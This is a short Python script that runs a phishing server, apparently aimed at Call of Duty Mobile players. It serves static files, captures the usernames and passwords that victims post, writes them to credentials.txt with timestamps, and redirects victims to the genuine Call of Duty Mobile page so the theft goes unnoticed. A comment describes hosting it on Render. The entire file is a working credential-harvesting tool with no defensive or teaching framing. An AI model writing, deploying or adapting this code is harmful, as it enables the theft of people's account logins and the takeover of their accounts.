#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import datetime
import os

PORT = int(os.environ.get("PORT", 8000))  # ← read port from env

class CredentialHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        post_params = urllib.parse.parse_qs(post_data.decode('utf-8'))
        username = post_params.get('username', [''])[0]
        password = post_params.get('password', [''])[0]

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} | Username: {username}, Password: {password}\n"
        with open("credentials.txt", "a") as log_file:
            log_file.write(log_entry)

        self.send_response(302)
        self.send_header("Location", "https://www.callofduty.com/mobile")
        self.end_headers()

    def do_GET(self):
        super().do_GET()

# Bind to 0.0.0.0 so Render can route traffic to it
with socketserver.TCPServer(("0.0.0.0", PORT), CredentialHandler) as httpd:
    print(f"Server running on port {PORT}")
    httpd.serve_forever()
